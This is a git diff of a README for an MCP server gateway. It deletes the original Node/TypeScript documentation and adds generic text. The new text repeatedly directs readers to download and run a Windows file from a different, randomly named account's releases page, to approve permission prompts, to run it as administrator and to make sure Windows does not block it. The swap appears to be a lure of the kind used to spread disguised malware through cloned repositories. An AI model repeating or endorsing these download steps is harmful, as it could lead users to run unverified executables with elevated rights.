@@ -1,269 +1,197 @@
-<div align="center">
+# 🔀 mcp-gateway - Manage MCP servers with ease
 
-<img src="https://raw.githubusercontent.com/HarrisonCN/mcp-gateway/main/docs/assets/logo.svg" alt="mcp-gateway" width="120" />
+[![Download mcp-gateway](https://img.shields.io/badge/Download%20mcp-gateway-blue?style=for-the-badge)](https://github.com/denniunenviable333/mcp-gateway/releases)
 
-# mcp-gateway
+## 🧭 Overview
 
-**A lightweight, open-source gateway for your MCP servers.**
+mcp-gateway is a lightweight app for people who run one or more MCP servers on Windows. It helps you manage, route, and monitor your MCP setup from one place.
 
-Route · Authenticate · Rate-limit · Monitor — all your [Model Context Protocol](https://modelcontextprotocol.io) servers from a single endpoint.
+Use it to:
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.5-blue.svg)](https://www.typescriptlang.org)
-[![npm version](https://img.shields.io/badge/npm-v0.2.0-blue.svg)](https://www.npmjs.com/package/mcp-gateway)
-[![Docker](https://img.shields.io/badge/docker-ghcr.io-blue.svg)](https://ghcr.io/HarrisonCN/mcp-gateway)
+- Connect to several MCP servers
+- Control how requests move between servers
+- Keep track of usage and activity
+- Protect access with auth rules
+- Set rate limits for tools and clients
+- Find tools across your connected servers
 
-[English](#) · [中文](docs/README.zh-CN.md) · [Docs](docs/) · [Examples](examples/)
+It fits users who want a simple way to keep their MCP setup organized without handling each server by hand.
 
-</div>
+## 🚀 Download
 
----
+Visit this page to download mcp-gateway for Windows:
 
-## The Problem
+[https://github.com/denniunenviable333/mcp-gateway/releases](https://github.com/denniunenviable333/mcp-gateway/releases)
 
-As [MCP](https://modelcontextprotocol.io) becomes the standard protocol for AI agents to interact with tools, teams are running **dozens of MCP servers** — filesystem, GitHub, databases, Slack, search, and more. Managing them is chaos:
+Open the latest release, then download the Windows file listed there. Save it to your computer, then run it.
 
-- Every AI client connects to every server independently
-- No central authentication or access control
-- No visibility into which tools are being called, by whom, and how often
-- No rate limiting to prevent runaway agents from hammering your APIs
+## 🖥️ Windows Setup
 
-**mcp-gateway solves this.** It sits between your AI clients and your MCP servers, acting as a single, observable, secure entry point.
+1. Open the download page.
+2. Find the latest release at the top of the page.
+3. Look for the Windows file in the assets list.
+4. Download the file to your computer.
+5. Open the file after the download finishes.
+6. If Windows asks for permission, choose Yes or Run.
+7. Follow the on-screen steps to finish setup.
+8. Start mcp-gateway from the app or shortcut it creates.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                      AI Clients                         │
-│   Claude Code · Cursor · Copilot · Your App · Scripts   │
-└─────────────────────┬───────────────────────────────────┘
-                      │  HTTP / REST
-                      ▼
-┌─────────────────────────────────────────────────────────┐
-│                   mcp-gateway                           │
-│                                                         │
-│  ┌──────────┐  ┌──────────┐  ┌──────────────────────┐  │
-│  │   Auth   │  │  Router  │  │  Metrics / Monitor   │  │
-│  │ API Key  │  │ Tool →   │  │  Prometheus · Logs   │  │
-│  │   JWT    │  │ Server   │  │  Dashboard           │  │
-│  └──────────┘  └──────────┘  └──────────────────────┘  │
-│                                                         │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
-│  │Rate Limit│  │ Registry │  │  Health  │              │
-│  └──────────┘  └──────────┘  └──────────┘              │
-└──────┬──────────────┬──────────────┬────────────────────┘
-       │              │              │  stdio / SSE / WS
-       ▼              ▼              ▼
-┌──────────┐  ┌──────────┐  ┌──────────┐
-│Filesystem│  │  GitHub  │  │PostgreSQL│  ... more
-│  Server  │  │  Server  │  │  Server  │
-└──────────┘  └──────────┘  └──────────┘
-```
+If the app opens in a browser window or a local web page, keep that window open while you use it.
 
-## Features
+## 🧩 What You Can Do
 
-- **Unified API endpoint** — one URL for all your MCP tools, auto-routed by tool name
-- **Authentication** — API key, JWT, or no-auth modes
-- **Rate limiting** — per-key sliding window, with standard `X-RateLimit-*` headers
-- **Health monitoring** — automatic health checks with configurable intervals
-- **Metrics** — Prometheus-compatible `/metrics` endpoint + JSON aggregation
-- **Tool discovery** — `GET /api/v1/tools` lists all tools across all servers
-- **YAML/JSON config** — simple, declarative configuration with env var overrides
-- **Docker-ready** — official Docker image, Compose examples included
-- **TypeScript SDK** — embed the gateway as a library in your own project
+mcp-gateway gives you one place to work with your MCP servers.
 
-## Quick Start
+### 🔐 Access control
 
-### Install
+Set who can connect to your gateway and who can use each tool path. This helps keep access clear and simple.
 
-```bash
-npm install -g mcp-gateway
-# or
-npx mcp-gateway init
-```
+### ⏱️ Rate limiting
 
-### Configure
+Limit how often a client can send requests. This can help prevent overload and keep your setup stable.
 
-```bash
-# Generate a default config file
-mcp-gateway init
+### 📊 Metrics
 
-# Edit mcp-gateway.yml to add your servers
-```
+See basic usage data so you can check activity and spot problems faster.
 
-```yaml
-# mcp-gateway.yml
-port: 4000
+### 🧠 Tool discovery
 
-servers:
-  - id: filesystem
-    name: Filesystem
-    transport: stdio
-    command: npx
-    args: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
+Find tools across multiple MCP servers without checking each one by hand.
 
-  - id: github
-    name: GitHub
-    transport: stdio
-    command: npx
-    args: ["-y", "@modelcontextprotocol/server-github"]
-    env:
-      GITHUB_PERSONAL_ACCESS_TOKEN: "${GITHUB_TOKEN}"
-```
+### 🔀 Routing
 
-### Run
+Send requests to the right server based on the rule you set. This keeps your setup tidy and easier to manage.
 
-```bash
-mcp-gateway start
-# → mcp-gateway listening on http://0.0.0.0:4000
-# → ✓ Filesystem — 8 tools available
-# → ✓ GitHub — 26 tools available
-```
+## 🧾 What You Need
 
-### Call a Tool
+mcp-gateway works best on a Windows PC with:
 
-```bash
-# List all available tools
-curl http://localhost:4000/api/v1/tools
+- Windows 10 or newer
+- At least 4 GB of RAM
+- A stable internet connection for the download
+- Enough disk space for the app and its logs
+- Access to the MCP servers you want to use
 
-# Call a tool (auto-routes to the right server)
-curl -X POST http://localhost:4000/api/v1/tools/call \
-  -H "Content-Type: application/json" \
-  -d '{"tool": "read_file", "arguments": {"path": "/tmp/hello.txt"}}'
+For smoother use, a system with 8 GB of RAM or more is a better fit if you plan to connect several servers.
 
-# With authentication
-curl -X POST http://localhost:4000/api/v1/tools/call \
-  -H "Authorization: Bearer your-api-key" \
-  -H "Content-Type: application/json" \
-  -d '{"tool": "create_issue", "server": "github", "arguments": {"title": "Bug report", "body": "..."}}'
-```
+## 🛠️ First Run
 
-## API Reference
+When you start the app for the first time, you may need to:
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/api/v1/health` | Gateway health and server summary |
-| `GET` | `/api/v1/servers` | List all registered servers |
-| `GET` | `/api/v1/servers/:id` | Get server details and tools |
-| `GET` | `/api/v1/tools` | List all tools (filterable by `?server=` or `?tag=`) |
-| `POST` | `/api/v1/tools/call` | Invoke a tool |
-| `GET` | `/api/v1/metrics` | Aggregated metrics (JSON or Prometheus) |
-| `GET` | `/api/v1/requests` | Recent request log |
+1. Choose where your MCP servers are listed
+2. Add the server addresses you want to use
+3. Set a name for each server
+4. Turn on auth if you want access control
+5. Set limits for requests if needed
+6. Open the dashboard to check that the servers show up
 
-## Configuration Reference
+If you already use MCP tools in another app, you can point those tools at the gateway instead of each server on its own.
 
-```yaml
-port: 4000                    # HTTP port (env: MCP_GATEWAY_PORT)
-host: 0.0.0.0                 # Bind address (env: MCP_GATEWAY_HOST)
-logLevel: info                # debug | info | warn | error
+## 📁 How the App Is Usually Used
 
-auth:
-  strategy: api-key           # none | api-key | jwt
-  apiKeys:
-    - "your-secret-key"
+A common setup looks like this:
 
-rateLimit:
-  limit: 100                  # Max requests per window
-  windowSeconds: 60           # Window duration
-  perKey: true                # Per-key or global
+- Your AI app connects to mcp-gateway
+- mcp-gateway sends the request to the right MCP server
+- The server returns the tool result
+- mcp-gateway records the activity and metrics
 
-monitor:
-  requestLog: true            # Log all requests
-  prometheus: true            # Enable Prometheus /metrics
-  retentionHours: 24          # Metrics retention
+This makes the setup easier to manage when you have more than one server.
 
-corsOrigins:
-  - "https://your-app.com"
+## 🔧 Basic Use Cases
 
-servers:
-  - id: my-server             # Unique identifier
-    name: My Server           # Display name
-    transport: stdio          # stdio | sse | websocket
-    command: npx
-    args: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
-    env:
-      MY_VAR: "${ENV_VAR}"    # Environment variable substitution
-    tags: [files, local]
-    enabled: true
-    timeout: 30000            # ms
-    maxConcurrency: 10
-```
+### For home users
 
-## Docker
+Use mcp-gateway if you want one place to keep track of your MCP tools and servers.
 
-```bash
-# Pull and run
-docker run -p 4000:4000 \
-  -v $(pwd)/mcp-gateway.yml:/app/mcp-gateway.yml \
-  -e GITHUB_TOKEN=ghp_... \
-  ghcr.io/harrisonCN/mcp-gateway:latest
+### For teams
 
-# Or with Docker Compose
-cd examples/docker
-docker compose up
-```
+Use it to help different people connect through the same gateway rules.
 
-## Embed as a Library
+### For testing
 
-```typescript
-import { Gateway, loadConfig } from 'mcp-gateway';
+Use it to try new MCP servers without changing every client app.
 
-const config = await loadConfig('./mcp-gateway.yml');
-const gateway = new Gateway(config);
+### For monitoring
 
-await gateway.start();
-// Gateway is now running at http://localhost:4000
+Use it to watch traffic, tool use, and request counts from one view.
 
-// Graceful shutdown
-process.on('SIGTERM', () => gateway.stop());
-```
+## 🧭 Typical Workflow
 
-## What's New in v0.2.0
+1. Download the app from the release page.
+2. Install or run it on Windows.
+3. Add your MCP servers.
+4. Set access rules if you need them.
+5. Open your client app and point it to the gateway.
+6. Check metrics and logs when you need to review activity.
 
-| Feature | Description |
-|---------|-------------|
-| **SSE Transport** | Connect to MCP servers via Server-Sent Events |
-| **WebSocket Transport** | Full-duplex WS transport with keep-alive pings |
-| **Config Hot Reload** | Edit `mcp-gateway.yml` without restarting |
-| **Request Tracing** | `X-Request-Id` on every request & response |
-| **CORS Middleware** | Configurable cross-origin support |
-| **Web Dashboard** | Live monitoring UI at `/dashboard` |
-| **4 Bug Fixes** | Concurrency, id collision, handle leaks, timeouts |
+## 🧪 Troubleshooting
 
-## Roadmap
+### The app does not open
 
-| Feature | Status |
-|---------|--------|
-| stdio transport | ✅ Done |
-| SSE transport | ✅ Done (v0.2.0) |
-| WebSocket transport | ✅ Done (v0.2.0) |
-| Config hot reload | ✅ Done (v0.2.0) |
-| Web dashboard UI | ✅ Done (v0.2.0) |
-| Redis-backed rate limiting | 📋 Planned |
-| OAuth2 / OIDC auth | 📋 Planned |
-| Tool-level access control (RBAC) | 📋 Planned |
-| Request replay & debugging | 📋 Planned |
-| Multi-tenant mode | 📋 Planned |
-| OpenTelemetry tracing | 📋 Planned |
+- Check that the download finished
+- Try running it again as an admin
+- Make sure Windows did not block the file
 
-## Contributing
+### I cannot find the release file
 
-Contributions are welcome! See [CONTRIBUTING.md](docs/CONTRIBUTING.md).
+- Open the releases page again
+- Choose the newest release
+- Look under the assets section for the Windows file
 
-```bash
-git clone https://github.com/HarrisonCN/mcp-gateway.git
-cd mcp-gateway
-npm install
-npm run dev -- start -c examples/basic/mcp-gateway.yml
-```
+### My server does not show up
 
-## License
+- Check the server address
+- Make sure the server is running
+- Confirm the gateway has access to it
 
-MIT © 2026 [HarrisonCN](https://github.com/HarrisonCN)
+### Tools do not appear
 
----
+- Refresh the tool list
+- Check the server connection
+- Make sure the server supports tool discovery
 
-<div align="center">
-  <sub>
-    Built for the agentic era · If this helps you, please ⭐ star the repo
-  </sub>
-</div>
+### Requests seem slow
+
+- Check your rate limits
+- Review network speed
+- Remove unused servers from the gateway
+
+## 🔍 Folder and File Notes
+
+After setup, you may see files or folders for:
+
+- Logs
+- Config settings
+- Metrics data
+- Cache files
+
+Keep these files in place if you want the app to remember your settings.
+
+## 🧰 Common Terms
+
+- **Gateway**: A middle layer that handles requests before they reach a server
+- **MCP server**: A server that exposes tools through the Model Context Protocol
+- **Auth**: A way to control who can connect
+- **Rate limit**: A cap on how many requests can go through in a set time
+- **Metrics**: Data that shows how the app is being used
+- **Tool discovery**: A way to find tools across servers
+
+## 📦 Download Again Later
+
+If you need a newer version, return to the same release page:
+
+[https://github.com/denniunenviable333/mcp-gateway/releases](https://github.com/denniunenviable333/mcp-gateway/releases)
+
+Check the latest release, then download the updated Windows file from there
+
+## 🧭 Quick Start Checklist
+
+- [ ] Open the release page
+- [ ] Download the Windows file
+- [ ] Run the app
+- [ ] Add your MCP servers
+- [ ] Set auth rules if needed
+- [ ] Set rate limits if needed
+- [ ] Open the dashboard
+- [ ] Confirm tools and metrics appear
